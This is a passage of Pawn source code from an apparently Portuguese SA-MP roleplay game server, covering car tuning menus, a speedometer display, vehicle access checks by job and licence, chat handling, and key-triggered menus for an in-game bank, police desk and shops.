     			ShowPlayerDialog(playerid, DIALOG_TUNNING+14, DIALOG_STYLE_LIST, "Tunning Menu", "Verde\nAmarelo\nBranco\nRosa\nVermelho\nAzul", "Selecionar", "Sair");
     			
			}
			if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
		}
	}
	if(dialogid == DIALOG_TUNNING+14)
	{
	    if(!response) return 1;
	    
		switch(listitem)
		{
			case 0:
			{
			    cInfo[car][Neon] = NEON_VERDE;
			}
			case 1:
			{
			    cInfo[car][Neon] = NEON_AMARELO;
			}
			case 2:
			{
                cInfo[car][Neon] = NEON_BRANCO;
			}
			case 3:
			{
			    cInfo[car][Neon] = NEON_ROSA;
			}
			case 4:
			{
			    cInfo[car][Neon] = NEON_VERMELHO;
			}
			case 5:
			{
			    cInfo[car][Neon] = NEON_AZUL;
			}
		}
		SendClientMessage(playerid, COLOR_INFO, "Compraste Neons");
		GuardarCarro(car);
	}
   	if(dialogid == DIALOG_TUNNING+13)//Wheels 2
   	{
		if(response)
		{

			if(GetPlayerMoneyEx(playerid) < 15000)
			{
				SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
  				return 1;
			}
	 		GivePlayerMoneyEx(playerid, -15000);

			if(listitem == 0)//Trance
            {
		         AddVehicleComponentEx(car,1084);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Trance ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 1)//Shadow
            {
		         AddVehicleComponentEx(car,1073);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Shadow ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 2)//Rimshine
            {
		         AddVehicleComponentEx(car,1075);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT," Adicionaste a roda Rimshine ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 3)//Classic
            {
		         AddVehicleComponentEx(car,1077);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Classic ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 4)//Cutter
            {
		         AddVehicleComponentEx(car,1079);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Cutter ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 5)//Switch
            {
		         AddVehicleComponentEx(car,1080);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Switch ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 6)//Dollar
            {
		         AddVehicleComponentEx(car,1083);
		         PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		         SendClientMessage(playerid,COLOR_CHAT,"Adicionaste a roda Dollar ao teu carro.");
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+13, DIALOG_STYLE_LIST, "Tipo de rodas:", "Trance\nShadow\nRimshine\nClassic\nCutter\nSwitch\nDollar\nVoltar", "Selecionar", "Sair");
            }
            if(listitem == 7)//BACK
            {
		         ShowPlayerDialog(playerid, DIALOG_TUNNING+10, DIALOG_STYLE_LIST, "Tipo de rodas:", "Offroad\nMega\nWires\nTwist\nGrove\nImport\nAtomic\nAhab\nVirtual\nAccess\nProxima Pagina\nVoltar", "Selecionar", "Sair");
   			}
		}
		return 1;
 	}
	
    return 0;
}

public OnPlayerStateChange(playerid, newstate, oldstate)
{
    if(oldstate == PLAYER_STATE_ONFOOT && newstate == PLAYER_STATE_DRIVER)
    {
        new car = GetPlayerVehicleID(playerid);
        new gasolina[8];
        
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[0]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[1]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[2]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[3]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[4]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[5]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[6]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[7]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[8]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[9]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[10]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[11]);
        TextDrawShowForPlayer(playerid, TDEditor_TDVel[12]);
        PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][0]);
        PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][1]);
        PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][2]);
        
        if(cInfo[car][Travao] == 1)
        {
            PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], COLOR_ERRO);
        }
        else
        {
            PlayerTextDrawColor(playerid, TDEditor_PTD[playerid][3], -1);
        }
        
        PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][3]); // (!)
        PlayerTextDrawShow(playerid, TDEditor_PTD[playerid][4]);

        format(gasolina, sizeof(gasolina), "%d", cInfo[car][Gasolina]);
        PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][1], gasolina);
        
        format(gasolina, sizeof(gasolina), "%d", cInfo[car][Kilometros]);
        PlayerTextDrawSetString(playerid, TDEditor_PTD[playerid][2], gasolina);
        
        TimerVelocimetro[playerid] = SetTimerEx("Velocimetro", 300, true, "i", playerid);
        
        CounterVelocimetro[playerid] = 0;
        CounterKilometros[playerid] = 0;
        
        PlayerActionMessage(playerid, 15.0, "entra no veículo.");
    }
    
    if(oldstate == PLAYER_STATE_DRIVER && newstate == PLAYER_STATE_ONFOOT)
    {
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[0]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[1]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[2]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[3]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[4]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[5]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[6]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[7]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[8]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[9]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[10]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[11]);
	    TextDrawHideForPlayer(playerid, TDEditor_TDVel[12]);
	    PlayerTextDrawHide(playerid, TDEditor_PTD[playerid][0]);
	    PlayerTextDrawHide(playerid, TDEditor_PTD[playerid][1]);
	    PlayerTextDrawHide(playerid, TDEditor_PTD[playerid][2]);
	    PlayerTextDrawHide(playerid, TDEditor_PTD[playerid][3]);
	    PlayerTextDrawHide(playerid, TDEditor_PTD[playerid][4]);

	    KillTimer(TimerVelocimetro[playerid]);
	    
	    StopAudioStreamForPlayer(playerid);
	    
	    if(Cinto[playerid] == true)
	    {
	        PlayerActionMessage(playerid, 15.0, "clica no botão e tira o cinto de segurança.");
	    }
	    
	    Cinto[playerid] = false;
		CounterKilometros[playerid] = 0;
		CounterVelocimetro[playerid] = 0;

	    PlayerActionMessage(playerid, 15.0, "sai do veículo.");
    }
    
    return 1;
}

public OnVehicleDeath(vehicleid, killerid)
{
	cInfo[vehicleid][Vida] = 300.0;
    
    return 1;
}

public OnVehicleSpawn(vehicleid)
{
	SetVehicleHealth(vehicleid, cInfo[vehicleid][Vida]);
    
    AtualizarTunning(vehicleid);
    
    return 1;
}

public OnPlayerExitVehicle(playerid, vehicleid)
{

    return 1;
}

public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	new car = vehicleid;

	if(AdminDuty[playerid] == false)
	{
	    if(cInfo[car][Apreendido] == 1 && fInfo[pInfo[playerid][Faction]][Type] != F_POLICIA)
	    {
			RemoverJogadorDoCarro(playerid);
			GameTextForPlayer(playerid, "~b~Apreendido.", 1500, 1);

			return 1;
	    }
	    if(cInfo[car][Trancado] == 1)
	    {
			RemoverJogadorDoCarro(playerid);
			GameTextForPlayer(playerid, "~r~Trancado.", 1500, 1);
			
			return 1;
	    }
	    if(cInfo[car][Type] == 0)
	    {
			RemoverJogadorDoCarro(playerid);
			SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro não está configurado. Contacta um administrador.");
			
			return 1;
	    }
		else if(cInfo[car][Type] != 0 && cInfo[car][Type] != -1 && cInfo[car][Type] != -2 && cInfo[car][Type] != 50 && cInfo[car][Type] != 51 && cInfo[car][Type] != 52 && cInfo[car][Type] != 53)
		{
			if(pInfo[playerid][TempoRota] != 0)
			{
				RemoverJogadorDoCarro(playerid);
				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Ainda tens de descansar!");

				return 1;
			}
			if(cInfo[car][Type] != pInfo[playerid][Emprego])
			{
				RemoverJogadorDoCarro(playerid);
				SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não pertences a esse emprego!");

				return 1;
			}
			if(!ispassenger)
			{
				if(IsVehicleOccupied(car) == 1)
				{
					RemoverJogadorDoCarro(playerid);
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro já está ocupado!");

					return 1;
				}
			}
		}
		else if(cInfo[car][Type] == 50 || cInfo[car][Type] || 51 && cInfo[car][Type] || 52 && cInfo[car][Type] || 53)
		{
		    if(cInfo[car][Type] == 50)  // Ligeiros
		    {
		        if(ATirarCartaLigeiro[playerid] == false)
		        {
					RemoverJogadorDoCarro(playerid);
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a tirar a Carta de Ligeiros!");

					return 1;
		        }
		        else
		        {
					if(!ispassenger)
					{
						if(IsVehicleOccupied(car) == 1)
						{
							RemoverJogadorDoCarro(playerid);
							SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro já está ocupado!");

							return 1;
						}
					}
		        }
		    }
		    else if(cInfo[car][Type] == 51)
		    {
		        if(ATirarCartaPesados[playerid] == false) // Pesados
		        {
					RemoverJogadorDoCarro(playerid);
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a tirar a Carta de Pesados!");

					return 1;
		        }
		        else
		        {
					if(!ispassenger)
					{
						if(IsVehicleOccupied(car) == 1)
						{
							RemoverJogadorDoCarro(playerid);
							SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro já está ocupado!");

							return 1;
						}
					}
		        }
		    }
		    else if(cInfo[car][Type] == 52)
		    {
		        if(ATirarCartaMota[playerid] == false) // Motociclos
		        {
					RemoverJogadorDoCarro(playerid);
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a tirar a Carta de Motociclos!");

					return 1;
		        }
		        else
		        {
					if(!ispassenger)
					{
						if(IsVehicleOccupied(car) == 1)
						{
							RemoverJogadorDoCarro(playerid);
							SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro já está ocupado!");

							return 1;
						}
					}
		        }
		    }
		    else if(cInfo[car][Type] == 52)
		    {
		        if(ATirarCartaBarco[playerid] == false) // Barco
		        {
					RemoverJogadorDoCarro(playerid);
					SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás a tirar a Carta de Barco!");

					return 1;
		        }
		        else
		        {
					if(!ispassenger)
					{
						if(IsVehicleOccupied(car) == 1)
						{
							RemoverJogadorDoCarro(playerid);
							SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Esse carro já está ocupado!");

							return 1;
						}
					}
		        }
		    }
		}
	}

    return 1;
}

public OnPlayerText(playerid, text[])
{
    Tickbefore_Text[playerid] = GetTickCount();
    
    new string[256];
    
    ChatLog(playerid, text);
    
	if(Logged[playerid] == false)
	{
    	SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás logado!");
        return 0;
	} 
	
	if(AdminDuty[playerid] == false)
	{
		format(string, sizeof(string), "%s", text);
		ProxDetectorChat(25.0, playerid, string, CHAT_TYPE_NORMAL);
	}
	else
	{
		format(string, sizeof(string), "%s", text);
		ProxDetectorChatDuty(25.0, playerid, string);
	}
	
	if(ASerEntrevistado[playerid] == true)
	{
	    format(string, sizeof(string), "[PC-NEWS:] %s diz: %s", GetPlayerNameEx(playerid), text);

    	foreach(new i : Player)
    	{
        	// if(!IsPlayerConnected(i)) continue;
			if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
			if(IsPlayerInAnyVehicle(i))
			{
			    new car = GetPlayerVehicleID(i);
				if(cInfo[car][RadioStatus] == 0) continue;
			}
			SendClientMessage(i, COLOR_NEWS, string);
    	}
	}
	if(AEntrevistar[playerid] == true)
	{
	    format(string, sizeof(string), "[PC-NEWS:] %s %s diz: %s", GetRankName(pInfo[playerid][Faction], pInfo[playerid][FactionRank]), GetPlayerNameEx(playerid), text);

		foreach(new i : Player)
    	{
        	// if(!IsPlayerConnected(i)) continue;
        	if(!IsPlayerInAnyVehicle(i) && pObjects[i][Radio] == 0) continue;
			if(IsPlayerInAnyVehicle(i))
			{
			    new car = GetPlayerVehicleID(i);
				if(cInfo[car][RadioStatus] == 0) continue;
			}
			
			SendClientMessage(i, COLOR_NEWS, string);
    	}
	}
	if(AFalarTele[playerid] == true)
	{
		new name[24];
		
		if(IsAmigo(AFalarPara[playerid], playerid) == 1)
		{
			format(name, sizeof(name), "%s", GetPlayerNameEx(playerid));
		}
		else
		{
			format(name, sizeof(name), "%d", pInfo[playerid][NumeroTelemovel]);
		}
		
	    format(string, sizeof(string), "{FFFF00}[TELEMÓVEL:] Disseste: {FFFFFF}%s", GetPlayerNameEx(playerid), text);
	    SendClientMessage(playerid, COLOR_INFO, string);
	    
	    format(string, sizeof(string), "{FFFF00}[TELEMÓVEL:] %s disse: {FFFFFF}%s", name, text);
	    SendClientMessage(AFalarPara[playerid], COLOR_INFO, string);
	}
	
	Tickafter_Text[playerid] = GetTickCount();
	
	if(Tickbefore_Text[playerid] <= Tickafter_Text[playerid] && Tickafter_Text[playerid]-Tickbefore_Text[playerid] < 5000)
	{
		TickTotal_Text += Tickafter_Text[playerid]-Tickbefore_Text[playerid];
		TickCount_Text++;

		if(DebugStatus[playerid] == true)
		{
			new stringcmd[128];

			format(stringcmd, sizeof(stringcmd), "[DEBUG:] {FFFFFF}OnPlayerText executado em %d ms", floatround(Tickafter_Text[playerid]-Tickbefore_Text[playerid], floatround_round));
			SendClientMessage(playerid, COLOR_RED, stringcmd);
		}
	}
	
    return 0; 
}

public LigarMotor(playerid)
{
    new car = GetPlayerVehicleID(playerid);
    new engine, lights, alarm, doors, bonnet, boot, objective;
    
 	GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(car, 1,lights,alarm,doors,bonnet,boot,objective);
	
	Motor[car] = true;
	
	if(cInfo[car][IsCaravana] == 1 || cInfo[car][IsCaravana] == 2)
	{
	 	DestroyDynamicPickup(HousePickup[cInfo[car][CaravanaCasaID]]);
	 	DestroyDynamic3DTextLabel(HouseLabel[cInfo[car][CaravanaCasaID]]);

		hInfo[cInfo[car][CaravanaCasaID]][EnterX] = 0;
		hInfo[cInfo[car][CaravanaCasaID]][EnterY] = 0;
		hInfo[cInfo[car][CaravanaCasaID]][EnterZ] = 0;
		hInfo[cInfo[car][CaravanaCasaID]][EnterAngle] = 0;
		hInfo[cInfo[car][CaravanaCasaID]][EnterInterior] = 0;
		hInfo[cInfo[car][CaravanaCasaID]][EnterVirtualWorld] = 0;
	}
	
	return 1;
}

public Morte(playerid)
{
    SetPlayerHealthEx(playerid, 1000, 0);
    SetPlayerArmourEx(playerid, 0, 0);
	//GivePlayerMoneyEx(playerid, 100);

	SetPlayerPosEx(playerid, pInfo[playerid][MorteX], pInfo[playerid][MorteY], pInfo[playerid][MorteZ]);
	
	SetPlayerInterior(playerid, pInfo[playerid][MorteInterior]);
	SetPlayerVirtualWorld(playerid, pInfo[playerid][MorteVirtualWorld]);
	
    GameTextForPlayer(playerid,"~r~ Gravemente Ferido", 15000, 5);
    PlayerActionMessage(playerid, 15.0, "cai para o chão desmaiado.");
    
    ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,2000,1);
    ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,2000,1);
    
	TogglePlayerControllable(playerid, 0);

	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	Tickbefore_Key[playerid] = GetTickCount();
	
	if(newkeys == 8)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
		    cmd_entrar(playerid, "", 0);
		    cmd_sair(playerid, "", 0);
	    }
	    else if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        cmd_entrar(playerid, "", 0);
	    }
	}
	if(newkeys == KEY_HANDBRAKE)
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
	        cmd_portapsp(playerid, "", 0);
		}
		cmd_garagempsp(playerid, "", 0);
		cmd_garagemsr(playerid, "", 0);
	}
	
	if(newkeys == KEY_NO) // N
	{
	    if(IsPlayerInRangeOfPoint(playerid, 1.0, oInfo[0][EmpregoX], oInfo[0][EmpregoY], oInfo[0][EmpregoZ]))
		{
			new string[128], sdialog[512];

			format(string, sizeof(string), "{00FF00}[1] {FFFFFF}%s", jInfo[1][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}%s", jInfo[2][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}%s", jInfo[3][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}%s", jInfo[4][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}%s", jInfo[5][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[6] {FFFFFF}%s", jInfo[6][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[7] {FFFFFF}%s", jInfo[7][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[8] {FFFFFF}%s", jInfo[8][Nome]); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[9] {FFFFFF}%s", jInfo[9][Nome]); strcat(sdialog,string);

			ShowPlayerDialog(playerid, DIALOG_CENTROEMPREGO, DIALOG_STYLE_LIST, "{FFFF00}CENTRO DE EMPREGO", sdialog, "Selecionar", "Sair"); // azeite
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][TunningX], oInfo[0][TunningY], oInfo[0][TunningZ]))
		{
			if(fInfo[pInfo[playerid][Faction]][Type] != F_SR && AdminDuty[playerid] == false) return 1;
			if(GetPlayerVirtualWorld(playerid) == oInfo[0][TunningVirtualWorld])
			{
				GameTextForPlayer(playerid, "~w~Garagem de Tunning", 3500, 3);
				switch(GetVehicleModel(GetPlayerVehicleID(playerid)))
				{
    				case 562,565,559,561,560,575,534,567,536,535,576,411,579,602,496,518,527,589,597,419,
					533,526,474,545,517,410,600,436,580,439,549,491,445,604,507,585,587,466,492,546,551,516,
					426,547,405, 409,550,566,406,540,421,529,431,438,437,420,525,552,416,433,427,490,528,
					407,544,470,598,596,599,601,428,499,609,524,578,486,573,455,588,403,514,423,
					414,443,515,456,422,482,530,418,572,413,440,543,583,478,554,402,542,603,475,568,504,457,
     				483,508,429,541,415,480,434,506,451,555,477,400,404,489,479,442,458,467,558:
					{
						ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs - 35.000é\nCores - 2.000é\nEscapes - 10.000é\nFront Bumper - 20.000é\nRear Bumper - 20.000é\nRoof - 10.000é\nSpoilers - 20.000é\nSide Skirts - 10.000é\nBullbars - 7.000é\nRodas - 15.000é\nCar Stereo - 4.000é\nPréxima Pégina", "Selecionar", "Sair");
						return 1;
					}
					default: return SendClientMessage(playerid,COLOR_ERRO, "[ERRO:] {FFFFFF}Não podes modificar este veículo.");
				}
  			}
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][Banco1X], oInfo[0][Banco1Y], oInfo[0][Banco1Z]) || IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][Banco2X], oInfo[0][Banco2Y], oInfo[0][Banco2Z]))
		{
			new string[64], sdialog[512];

			format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Depositar"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Extrair"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Extrato"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Transferir"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[5] {FFFFFF}Carregar Telemóvel"); strcat(sdialog,string); 
			format(string, sizeof(string), "\n{00FF00}[6] {FFFFFF}Comprar Licença de Pesca"); strcat(sdialog,string);
			
			if(pInfo[playerid][Faction] != 0 && pInfo[playerid][FactionRank] == 1)
			{
				format(string, sizeof(string), "\n{00FF00}[7] {FFFFFF}Faction Extrato"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{00FF00}[8] {FFFFFF}Faction Extrair"); strcat(sdialog,string);
				format(string, sizeof(string), "\n{00FF00}[9] {FFFFFF}Faction Depositar"); strcat(sdialog,string);
			}
			
			ShowPlayerDialog(playerid, DIALOG_BANCO_MENU, DIALOG_STYLE_LIST, "{FFFF00}BANCO", sdialog, "Selecionar", "Sair");
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][PoliciaX], oInfo[0][PoliciaY], oInfo[0][PoliciaZ]))
		{
			new string[64], sdialog[256];

			format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Chamar um agente"); strcat(sdialog,string);
			format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Apresentar queixa"); strcat(sdialog,string);

			ShowPlayerDialog(playerid, DIALOG_PSP_MENU, DIALOG_STYLE_LIST, "{FFFF00}BALCÂO DA PSP", sdialog, "Selecionar", "Sair");
		}
		else if(IsPlayerInRangeOfPoint(playerid, 2.0, oInfo[0][CamaraMunicipalX], oInfo[0][CamaraMunicipalY], oInfo[0][CamaraMunicipalZ]))
		{
			new string[64], sdialog[256];

			format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Comprar Cartão de Cidadão {00FF00}[500$]"); strcat(sdialog,string);
			//format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Comprar Escritura {00FF00}[1000$]"); strcat(sdialog,string);

			ShowPlayerDialog(playerid, DIALOG_CM, DIALOG_STYLE_LIST, "{FFFF00}CÂMARA MUNICIPAL", sdialog, "Selecionar", "Sair");
		}
		else if(GetPlayerVirtualWorld(playerid) != 0) // está em casa, building ou biz
		{
			new vw = GetPlayerVirtualWorld(playerid);
			
			if(IsPlayerInRangeOfPoint(playerid, 4, bInfo[vw][ActorX], bInfo[vw][ActorY], bInfo[vw][ActorZ])) // tá perto do actor
			{
			    new sdialog[512];
				switch(bInfo[vw][Type])
				{
				    case BTYPE_RESTAURANTE:
				    {
						format(sdialog, sizeof(sdialog),
						"Comida\tPreço\tVida\n\
						Pizza\t$50\t35\n\
						Hamburguer\t$25\t25\n\
						Bifanas\t$10\t10\n\
						Taco\t$15\t15\n\
						Sande\t$5\t6");

						ShowPlayerDialog(playerid, DIALOG_LOJA_REST, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}RESTAURANTE", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_BAR:
				    {
						format(sdialog, sizeof(sdialog),
						"Bebida\tPreço\n\
						Cerveja\t$15\n\
						Tequilla\t$35\n\
						Vodka\t$25\n\
						Whiskey\t$50\n\
						Champagne\t$25\n\
						Bagaço\t$50\n\
						Vinho Tinto\t$20");

						ShowPlayerDialog(playerid, DIALOG_LOJA_BAR, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}BAR", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_247: 
				    {
						format(sdialog, sizeof(sdialog),
						"Serviço\tPreço\n\
						Comprar objeto\t$%d\n\
						Catálogo\t$%d", PRECO_SKIN, PRECO_ACESSORIO);

						ShowPlayerDialog(playerid, DIALOG_LOJA_247, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}24/7", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_TELE:
				    {
						format(sdialog, sizeof(sdialog),
						"Produto\tPreço\n\
						Telemóvel\t$%d", PRECO_TELE);

						ShowPlayerDialog(playerid, DIALOG_LOJA_TELE, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}LOJA DE TELECOMUNICAÇES", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_STAND:
				    {
				        new string[128];
				        
						format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Catálogo"); strcat(sdialog,string);
						format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Comprar veículo"); strcat(sdialog,string);

						ShowPlayerDialog(playerid, DIALOG_LOJA_STAND, DIALOG_STYLE_LIST, "{FFFF00}STAND", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_CACA: 
				    {
			            Menu_Show(playerid, MenuArmas, 0x9FE5F5FF, false);
			            TogglePlayerControllable(playerid, false);

			 			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as armas.");
				    }
				    case BTYPE_ROUPA: 
				    {
						format(sdialog, sizeof(sdialog),
						"Serviço\tPreço\n\
						Comprar Roupa\t$%d\n\
						Comprar Acessório\t$%d", PRECO_SKIN, PRECO_ACESSORIO);

						ShowPlayerDialog(playerid, DIALOG_LOJA_ROUPA, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}LOJA DE ROUPA", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_FARMACIA:
				    {
				        new string[128];
				        
						format(string, sizeof(string), "{00FF00}[1] {FFFFFF}Cêgripe [$100]"); strcat(sdialog,string);
						format(string, sizeof(string), "\n{00FF00}[2] {FFFFFF}Cran-Aid [$100]"); strcat(sdialog,string);
						format(string, sizeof(string), "\n{00FF00}[3] {FFFFFF}Tylenol [$100]"); strcat(sdialog,string);
						format(string, sizeof(string), "\n{00FF00}[4] {FFFFFF}Bisolvon [$100]"); strcat(sdialog,string);

						ShowPlayerDialog(playerid, DIALOG_FARMACIA, DIALOG_STYLE_LIST, "{FFFF00}MENU DA LOJA", sdialog, "Selecionar", "Sair");
				    }
				    case BTYPE_SEGURADORA: 
				    {
						format(sdialog, sizeof(sdialog),
						"Serviço\tPreço\tMensalidade\n\
						Assinar Contrato\t$%d\t$%d\n\
						Cancelar Contrato\t---\t---", PRECO_CONTSEGURADORA, bInfo[vw][Seguradora]);

						ShowPlayerDialog(playerid, DIALOG_LOJA_SEGUR, DIALOG_STYLE_TABLIST_HEADERS, "{FFFF00}SEGURADORA", sdialog, "Selecionar", "Sair");
				    }
				}
			}
		}
	}
	
	if(IsPlayerInAnyVehicle(playerid))
	{
		if(newkeys == 1 && PLAYER_STATE_DRIVER)
		{
      		cmd_motor(playerid, "", 0);
		}
		if(newkeys == 4 && PLAYER_STATE_DRIVER)
		{
	    	cmd_luzes(playerid, "", 0);
		}
	}
	
	Tickafter_Key[playerid] = GetTickCount();

	if(Tickbefore_Key[playerid] <= Tickafter_Key[playerid] && Tickafter_Key[playerid]-Tickbefore_Key[playerid] < 5000)
	{
		TickTotal_Key += Tickafter_Key[playerid]-Tickbefore_Key[playerid];
		TickCount_Key++;

		if(DebugStatusKey[playerid] == true)
		{
			new stringcmd[128];

